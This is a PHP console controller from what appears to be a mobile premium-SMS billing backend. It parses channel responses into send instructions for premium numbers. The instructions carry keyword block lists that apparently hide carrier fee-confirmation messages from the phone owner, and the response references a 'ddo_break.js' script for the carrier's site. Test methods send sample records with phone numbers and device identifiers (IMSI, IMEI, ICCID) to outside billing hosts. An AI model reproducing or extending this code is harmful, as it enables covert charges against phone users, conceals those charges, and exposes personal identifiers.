<?php
/**
 * @link http://www.yiiframework.com/
 * @copyright Copyright (c) 2008 Yii Software LLC
 * @license http://www.yiiframework.com/license/
 */

namespace app\commands;

use yii\console\Controller;
use app\models\Util;

/**
 * This command echoes the first argument that you have entered.
 *
 * This command is provided as an example for you to learn how to create console commands.
 *
 * @author Qiang Xue <qiang.xue@gmail.com>
 * @since 2.0
 */
class SmsController extends Controller
{
    /**
     * This command echoes what you have entered as the message.
     * @param string $message the message to be echoed.
     */
    public function actionIndex(){
    	$response = <<<EOC
{"res":{"ch_id":"5321","ch_type":"507","ch_name":"华胜移动动漫渠道包_暴风包月15元","ch_desc":"","detail":"","corp_type":"","spnumber":"","sms_msg":"","scheme":"1","phone":"18701617138","amount":"1500","real_amount":"1500","orderid":"FCS16042221410272","isMonthly":"","fee_url":"","open_url":null,"sms_interval":"","sms_count":"1","sms_separator":"","sms_reply_num":"","sms_reply_keyword":null,"sms_reply_content":"","is_net_game":"29","fee_code_type":null,"game_code_detail":null,"sub_order_ids":null,"sdk_fee_type":"29","corp_fee_code":null,"wap_fee_match":null,"yzm_regx":"","again_interval":"","js_url_map":{"10086.cn":"http://fee.arc-soft.com:11000/sdk3/view/js/ddo_break.js"},"monthly":""},"msg":"ok","status":0}    	
EOC;
    	//echo mb_convert_encoding($response, "UTF-8", "GBK");
    	
    	$response = json_decode($response, TRUE);
    	print_r($response);
    	$logFile = 'abd.log';
    	if(Util::_array($response, 'status',1) == 0){
    		Util::plog("[{}] # 请求API成功\n", $logFile,true);
    		
    		$smsArr 		= Util::_array($response,'res');
    		$spOid 	= Util::_array($smsArr,'orderid');
    		$smsCount 	= Util::_array($smsArr,'sms_count');
    		$scheme 		= Util::_array($smsArr,'scheme');
    		if ($smsCount == 1) {// 3-短信代计费 直发模式
    			$pp = Util::_array($smsArr,'spnumber');
    			$pc = base64_decode(Util::_array($smsArr,'sms_msg'));
    			Util::plog("[] # Single类型的通道\n", $logFile,true);
    			Util::plog("[]pp:{$pp}\npc:{$pc}\n", $logFile,true);
    			$ch = array('type' => 1, 'sid' => '', 'detail' => array(
    					'pp' => $pp,
    					'pc' => $pc,
    					'bkList' => array(
    							array('port' => '1', 'keys' => array('成功' => 1, '费' => 1, '信息费' => 1, '电信代收' => 1)),
    							array('port' => '1', 'keys' => array('话费支付' => 1, '感谢' => 1,'购买' => 1, '支付' => 1, '客服' => 1)),
    							array('port' => '1', 'keys' => array('点播' => 1, '咪咕' => 1,'动漫' => 1, '业务' => 1, '资费' => 1, '费用' => 1)),
    					)
    			));    			
    			$res['data'] = $ch;
    			$res['flag'] = 1;
    		}elseif ($smsCount == 2){// 3-短信代计费 直发模式
    			$ppArr = explode('@@@', Util::_array($smsArr,'spnumber'));
    			$pcArr = explode('@@@', base64_decode(Util::_array($smsArr,'sms_msg')));
    			$pp = Util::_array($ppArr,0);
    			$pc = Util::_array($pcArr,0);
    			$pp2 = Util::_array($ppArr,1);
    			$pc2 = Util::_array($pcArr,1);
    			Util::plog("[{}]Double类型的通道\n", $logFile,true);
    			Util::plog("[{}]pp:{$pp}\npc:{$pc}\npp2:{$pp2}\npc2:{$pc2}\n", $logFile,true);
    			$ch = array('type' => 2, 'sid' => '', 'detail' => array(
    					'pp1' 	=> $pp,
    					'pc1' 	=> $pc,
    					'pp2' 	=> $pp2,
    					'pc2' 	=> $pc2,
    					'sl' 	=> Util::_array($smsArr,'sms_interval')),
    					'bkList' => array(
    							array('port' => '1', 'keys' => array('成功' => 1, '费' => 1, '信息费' => 1, '电信代收' => 1)),
    							array('port' => '1', 'keys' => array('点播' => 1, '咪咕' => 1,'动漫' => 1, '业务' => 1, '资费' => 1, '费用' => 1)),
    					)
    			);
    			
    			$res['data'] = $ch;
    			$res['flag'] = 1;
    		}else{//URL类型  //1-短信验证码 模式 URL 形式
    			Util::plog("[]触发验证码成功\n", $logFile,true);
    			$res['resultCode'] 	= 1;
    		}
    		$res['msg'] 		= 'success';
    	}else{
    		Util::plog("[] # 请求API失败\n", $logFile,true);
    		
    	}
    	print_r($res);
    	echo "\n end \n";
     //$json = '\u9A8C\u8BC1\u7801\u786E\u8BA4\u5931\u8D25,\u624B\u673A\u4F59\u989D\u4E0D\u8DB3\u6216\u8D85\u8FC7\u9650\u989D';
     //	$pc2 = Util::unicode_decode($json);
		//echo  $pc2 . "\n";
    }
    
    
    public function actionTest(){
    	$url = 'http://ydpayreq.i9188.net:8500/spApi/yddmApiNewReq.do?';
    	$json = '{"status":"DELIVRD","spid":"15294","mobile":"18924448669","linkid":"sms20160412150151965","msg":"ZDZF&02110108040994000&1000&&ZJL010&100&3&122&8AB6D","port":"1000","cpparam":"122","fee":"1000","province":"\u5e7f\u4e1c","action":"MMDXS"}';
		$api = array(
					'url' 		=> $url,
					'data' 	=> json_decode($json,true),
					'get'		=> 1,
					'format'	=> 'json'
			);			
		
		$response 	= Util::api($api);
    	print_r($response);
    }
    
    /**
     * 测试1
     */
    public  function  actionTest1(){
		$url = "http://p.maimob.cn/index.php/API?";
		$json = 'si=460022928988866&ei=867602029856239&ic=898600C9301558988866&gid=fqg10nx9czuq3wulattoo0bi&cha=maimob_channel_test&pt=1&cpOid=1460009550453&isTest=1&price=200&action=RP&msa=25dlwlAq0AC07pj4cjnaumgg&ver=2201&tp=1460009553';
		$api = array(
				'url' 		=> $url,
    			'data' 	=> json_decode($json,true),
				'get'		=> 1,
				'format'	=> 'json'
		);		
		$response 	= Util::api($api);
		print_r($response);
    }
    
    /**
     * 测试2
     */
    public function actionTest2(){
    	$url = 'http://pluto.maimob.net/index.php/Out/CMP/ss/cJinsNucsB?';
    	$json = '{"linkid":"20160418095620581uGklZy3c4G3o","cpparam":"GC0paR50PJ","mobile":"13156257953","port":"106566660020","msg":"000000015021","status":"DELIVRD","ss":"ZICHLfJXEj"}';
		$api = array(
					'url' 		=> $url,
					'data' 	=> json_decode($json,true),
					'get'		=> 0,
					'format'	=> 'text'
			);		
		
		$response 	= Util::api($api);
    	print_r($response);
    	
    }
   
  
}
